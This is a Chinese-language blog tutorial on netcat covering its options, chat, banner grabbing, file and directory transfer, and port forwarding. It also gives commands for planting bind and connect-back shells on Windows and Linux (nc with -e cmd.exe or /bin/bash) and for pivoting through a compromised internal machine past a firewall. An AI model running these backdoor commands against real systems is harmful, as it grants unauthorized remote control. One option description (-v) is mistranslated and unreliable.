---
title: necat的使用
date: 2020-09-14 14:06
swiper: false # 将改文章放入轮播图中
swiperImg: '' # 该文章在轮播图中的图片，可以是本地目录下图片也可以是http://xxx图片
img: 'http://cdn.mxrblog.cn/ct_12.jpg' # 该文章图片，可以是本地目录下图片也可以是http://xxx图片
categories: tool
tags: [necat, tool]   # 可以是数组
top: false
---

## netcat命令选项

#### 本文参考文章链接

[本文参考文章链接1](https://www.fujieace.com/linux/nc-2.html)

[本文参考文章链接2](https://jiajunhuang.com/articles/2020_09_19-linux_cmd_netcat.md.html)

[本文参考文章链接3](https://www.cnblogs.com/lpfuture/p/5719066.html)

<!--more-->

### 常用命令选项

```
## 网络模式和代理相关
-l 监听，作服务器。不填时作客户端。
-u UDP模式。不填时默认TCP模式。
-X 和 -x 是代理相关的选项

## 其余常用选项
-v verbose模式，打印更多日志
-z 连接以后就断开，用于测试网络连接是否连通 //探测端口的连通性
-w 超时时间，单位是秒
-s 指定source addr
-p 指定source port
-n 只识别IP地址，不查询DNS
-k 处理完一个请求之后，继续监听下一个
-d 脱离命令行窗口，在后台运行，常用于后门建立的过程
-e 执行某个程序，常用于后门建立的过程
-L 设置netcat处于监听状态等待链接，当客户端断开，服务器依旧回到等待状态
```

### 基本全部命令选项

```
用法：

ncat [选项] [主机名] [端口]

 

花费时间的选项以秒为单位。 附加“ ms”毫秒，“ s”表示秒，“ m”表示分钟，或“ h”表示小时（例如500ms）。

 

-4    仅使用IPv4

-6    仅使用IPv6

 

-U, --unixsock 仅使用Unix域套接字

	--vsock 仅使用vsock套接字

 

-C, --crlf 将CRLF用于EOL序列

-c, --sh-exec <command> 通过/bin/sh执行给定命令

-e, --exec <command> 执行给定命令

	--lua-exec <filename> 执行给定的Lua脚本

 

-g hop1[,hop2,...] 松散的源路由跳跃点（最大8个）

-G <n> 松散的源路由跳跃指针（4、8、12，...）

-m, --max-conns <n> 最大<n>同时连接

-h, --help 显示此帮助屏幕

-d, --delay <time> 在读/写之间等待时间

-o, --output <filename> 将会话数据转储到文件中

-x, --hex-dump <filename> 将会话数据以十六进制形式转储到文件中

-i, --idle-timeout <time> 空闲读/写超时时间

-p, --source-port port 指定要使用的源端口

-s, --source addr 指定要使用的源地址（不影响-l）

-l, --listen 绑定并监听传入的连接

-k, --keep-open 在侦听模式下接受多个连接

-n, --nodns 不通过DNS解析主机名

-t, --telnet 回答Telnet协商

-u, --udp 使用UDP代替默认TCP

	--sctp 使用SCTP代替默认TCP

 

-v, --verbose 使用SCTP代替默认TCP

-w, --wait <time> 连接超时时间

 

-z   零I/O模式，仅报告连接状态

    
```



## 1. 模拟聊天

- 服务器

```
nc -l -p [端口号]
```

- 客户端

```
nc [服务器ip] [服务器端口]
```



## 2.Banner抓取方法

- Banner是一个文本，Banner是一个你连接的服务器发送给你的文本信息。当你试图鉴别漏洞或者服务的类型和版本的时候，Banner信息是非常有用的。但是，并不是所有的服务都会发送banner。一旦你发现开放的端口，你可以容易的使用netcat 连接服务抓取他们的banner。

```
echo "" | nc -v -n w1 [target_ip] [开始端口-结束端口]
```



## 3.文件传输

### 从客户端传输文件到服务器

- 服务器

```
nc -l -p [端口号] > out_filename
```

- 客户端

```
nc [目标IP] [目标端口] < in_flimename
```

### 从服务器传输文件到客户端

- 服务器

```
nc -l -p [端口号] < in_filename
```

- 客户端

```
nc [目标IP] [目标端口] > out_flimename
```



## 4.目录传输（与文件传输类似）

- 服务器

```
tar -cvf - dir_name | nc -l [port_id]
```

- 客户端

```
nc -n [target_ip] [target_port] | tar -xvf - 
```



##  5. windows建立后门的方法

### 服务器——监听型后门

```
nc -l -p [port_id] -e cmd.exe
```

### 客户端——连接型后门

```
nc [target_ip] [target_port] -e cmd.exe
```



## 6、Linux下建立后门

### 服务器——监听型后门

```
nc -l -p [port_id] -e /bin/bash
```

### 客户端——连接型后门

```
nc [target_ip] [target_port] -e /bin/bash
```



## 7、连接转发

- 可以解决的问题

1. 对于无法访问内网特定机器的问题，我们可以先抓取内网一台机器，然后利用这台弱鸡进行端口转发，接受外网的数据，将数据转发到内网目标机器的特定端口。

```
'''
假设机器A和机器B是内网机器，机器B是我们的目标机器，机器C是外网机器，机器C和机器A是出于同一网段的，可以互相访问，机器C不可以访问机器B
'''
# bat文件中的内容： nc [ip_B] [port_B]
A: nc -l -p [port_A] -e XX.bat
B: nc -l -p [port_B] 
C: nc [ip_A] [prt_A]
```

2. 对于防火墙禁止访问某些端口的问题，比如3389端口，我们可以将利用机器的3000端口做端口转发，从外界接受数据，转发给本机的3389端口，从而绕过防火墙。

```
## 原理同上
```



## 8、反弹shell

[![BFDrmd.md.png](https://s1.ax1x.com/2020/10/22/BFDrmd.md.png)](https://imgchr.com/i/BFDrmd)



